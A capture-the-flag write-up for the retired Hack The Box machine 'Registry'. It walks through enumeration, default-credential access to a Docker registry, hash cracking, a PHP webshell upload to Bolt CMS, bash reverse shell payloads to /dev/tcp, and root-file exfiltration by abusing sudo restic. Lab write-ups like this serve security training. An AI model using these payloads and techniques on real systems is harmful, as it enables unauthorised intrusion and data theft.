# Registry

This is the write-up for the box Registry that got retired at the 4th April 2020.
My IP address was 10.10.14.2 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.159    registry.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/registry.nmap 10.10.10.159
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP & HTTPS (Port 80 & 443)

Both web services show the same version of **nginx** in the Nmap scan and also display the same _nginx default welcome page_.
The SSL certificate contains a hostname _docker.registry.htb_ that should be put into the _/etc/hosts_ file to connect to it.
After browsing to _docker.registry.htb_, it only shows a blank page, which means that something different is hosted there.

Lets search for hidden directories with **Gobuster** on the IP:
```
gobuster -u http://10.10.10.159 dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

- _/install_ (Status: 301)
  - Shows non readable characters on the page, so it could be a file

Downloading _/install_ and checking what kind of `file` it is:
```
wget http://10.10.10.159/install/

file index.html
```
```
index.html: gzip compressed data
```

Decompressing _gzip_ file:
```
gzip -d install.gz

gzip: install.gz: unexpected end of file
```

It cannot be decompressed, so trying to read it with `zcat`:
```
zcat install.gz > install2
```

The contents show some certificate and `file` says that it is a _tar archive_:
```
file install2

install2: POSIX tar archive (GNU)
```

Decompressing _tar_ file:
```
tar -xvf install2.tar
```

It extracts two files:
- _readme.md_: Links to **Docker** documentation

```
Private Docker Registry

docs.docker.com/registry/deploying/
docs.docker.com/engine/security/certificates/
```

- _ca.crt_: Contents of a certificate

```
-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
(...)
-----END CERTIFICATE-----
```

This certificate seems to be for some kind of **Docker** container, so lets check _docker.registry.htb_.

### Checking docker.registry.htb

Searching for hidden directories on _docker.registry.htb_:
```
gobuster -u http://docker.registry.htb dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

- _/v2_ (Status: 301)
  - Forwards to an API that asks for authentication

The default credentials _admin:admin_ work and logs us in, but there is no data in the API.
As this box is called **Registry** and had many hints to **Docker**, this is probably a [Docker Registry](https://docs.docker.com/registry/), which is a self-hosted registry to distribute own **Docker images**.

The documentation for the [Docker Registry HTTP API V2](https://docs.docker.com/registry/spec/api/) explains how to use it.

Listing all repositories:
```
GET /v2/_catalog
```
```
{"repositories":["bolt-image"]}
```

Show _tags_ of _bolt-image_:
```
GET /v2/bolt-image/tags/list
```
```
{"name":"bolt-image","tags":["latest"]}
```

Pulling the image:
```
GET /v2/bolt-image/manifests/latest
```

After getting enough information about the container, it can be accessed by connecting our local Docker installation to this registry.

## Enumerating Docker Container

Connecting to the Docker Registry on the box with the credentials _admin:admin_:
```
docker login docker.registry.htb
```
```
Username: admin  
Password:
INFO[0003] Error logging in to endpoint, trying next endpoint  error="Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority"
Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority
```

It does not trust the certificate and denies login, but the certificate _ca.crt_ found earlier could be the correct certificate.

Creating the directory with certificate trusts for Docker and copying _ca.crt_ there:
```
mkdir -p /etc/docker/certs.d/docker.registry.htb

cp ca.crt /etc/docker/certs.d/docker.registry.htb
```

Now login into the registry is successful:
```
docker login docker.registry.htb
```
```
Username: admin
Password:
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
```

Downloading and executing `sh` on the container:
```
docker run -it docker.registry.htb/bolt-image sh
```

This gives access to the container as root and the file system can be searched through.
There is an encrypted private SSH key in _/root/.ssh/id_rsa_ that is probably for the user _bolt_ as _/root/.ssh/id_rsa.pub_ shows that username.
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9

KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w
(...)
```

To find passwords, the container will be searched for modified files on a specific time range.
The SSL certificate _ca.crt_ from the beginning was created on May 6 2019 and the SSH keys on May 25 2019.

By searching for files in that time range, it can be found out which files were changed in that time range:
```
find / -type f -newermt "2019-05-05" ! -newermt "2019-05-26" -ls 2>/dev/null | grep -v ' /var/'
```

After looking through interesting files, a password can be found in the shell script _/etc/profile.d/01-ssh.sh_:  
```
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

Using the SSH key and the password, it is possible to log into the box via SSH as _bolt_:
```
ssh -i bolt_id_rsa bolt@10.10.10.159
```

## Privilege Escalation

After enumerating the box, an interesting file in the web directory _/var/www/html/backup.php_ is found:
```
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

The directory _bolt_ does exist and when browsing there, it shows a website built with [Bolt CMS](https://boltcms.io/).
```
http://10.10.10.159/bolt/
```

As that is a web service, the sudo command in the PHP script is probably ran by _www-data_.
So lets search for vulnerabilities for **Bolt CMS** to escalate privileges to _www-data_:
```
searchsploit bolt cms
```
```
Bolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Execution
```

There is one **Remote Code Execution vulnerability** for version 3.6.6 and the _bolt/changelog.md_ shows the newest version as 3.6.4, which means that the vulnerability should work.
Unfortunately it needs valid authentication information, so that needs to be searched first.

A database is found in _bolt/app/database/bolt.db_ that I will upload to my local box to read the contents of it.
```
scp -i bolt_id_rsa bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db .
```
```
file bolt.db

SQLite 3.x database
```

Getting contents out of the database:
```
sqlite3 bolt.db
```
```
sqlite> .dump

sqlite> .tables

sqlite> select * from bolt_users;
```
```
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|["files://shell.php"]|1||||0||["root","everyone"]
```

There is a **bcrypt hash** in there, so trying it to crack with **Hashcat**:
```
hashcat -m 3200 bolt_sqlite.hash /usr/share/wordlists/rockyou.txt
```

After a while it gets cracked and the password of _admin_ is:
> strawberry

Login with the credentials work on the Bolt login page:
```
http://10.10.10.159/bolt/bolt/login   
```

### Exploiting Bolt

Creating PHP webshell that will be uploaded (_shell.php_):
```
<?php system($_REQUEST['cmd']); ?>
```

Changing the configuration in **Bolt** to accept PHP files:
```
Configuration --> Main configuration --> Line 240: accept_file_types: [php, twig, html(...)]
```

> NOTE: There runs a cleanup script in the background that removes the changes regularly, so the next steps have do be done fast or several times

Uploading _shell.php_:
```
File Management --> Uploaded files --> Select file... --> Upload file
```

Now there is a link to the webshell and the output of `whoami` shows _www-data_:
```
http://10.10.10.159/bolt/files/shell.php?140d00115b&cmd=whoami
```

Lets execute a reverse shell command:
```
POST /bolt/files/shell.php HTTP/1.1
Host: 10.10.10.159
(...)
140d00115=&cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1'
```

Unfortunately it does not connect back to the reverse shell, so there are probably firewall rules that block this.
As we have access to the box with _bolt_, it is possible to read the _/etc/iptables.conf_ file to identify the problem:
```
(...)
-A OUTPUT -d 10.0.0.0/8 -p tcp -m tcp --tcp-flags FIN,SYN,RST,ACK SYN -j DROP
(...)
```

It is preventing TCP-handshakes to outbound, but as we are logged in on the box anyway, a listener can be started on the box instead:
```
nc -lvnp 9001
```

Sending the request to 127.0.0.1:
```
POST /bolt/files/shell.php HTTP/1.1
Host: 10.10.10.159
(...)
ba409963f1=&cmd=bash -c 'bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'
```

After URL-encoding and sending the request, the listener on the box and port 9001 starts a reverse shell as _www-data_.

### Privilege Escalation to root

As found out before, the `sudo` permissions of _www-data_ can run one command with [restic](https://github.com/restic/restic) as root:
```
sudo -l
```
```
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

As the file _/var/www/html/backup.php_ showed, it backups the directory _bolt_ to _backup.registry.htb_:
```
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

By changing the connection to our local client, it is possible to backup files to our client.
But as TCP connections to outbound are not allowed, this connection will be done through an **SSH tunnel** via the [SSH Control Sequences](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/):
```
ssh> -R 8000:127.0.0.1:8000
```

This forwards port 8000 from the machine to port 8000 on our local client and the **restic** connection goes through successfully:
```
sudo restic backup -r rest:http://127.0.0.1:8000/bolt bolt
```
```
# Local client

nc -lvnp 8000

Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 127.0.0.1:43232.

HEAD /bolt/config HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Go-http-client/1.1
Accept: application/vnd.x.restic.rest.v2
```

To make use of that connection, a **restic server** on our local client is needed:
```
apt install restic
```

Initializing a **restic repository** on local client:
```
restic init -r ./restic/
```

Setting up **restic server** in a Docker container:
```
docker run -p 8000:8000 -v /root/Documents/htb/boxes/registry/restic/:/restic -it restic/rest-server sh
```

Starting the server on Docker container:
```
/ # rest-server --path /restic --no-auth
```

Backing up the _/root_ directory from the box:
```
sudo restic backup -r rest:http://127.0.0.1:8000/ /root
```

After it finishes, restoring the files from the _restic repository_ to a new directory:
```
mkdir restore

restic -r restic/ restore latest --target restore/
```

There are now the backup files in _restore/root_ with the root flag and an SSH key in _root/.ssh_:
```
chmod 600 id_rsa

ssh -i id_rsa 10.10.10.159
```

The SSH key works and logs us into the box as root!
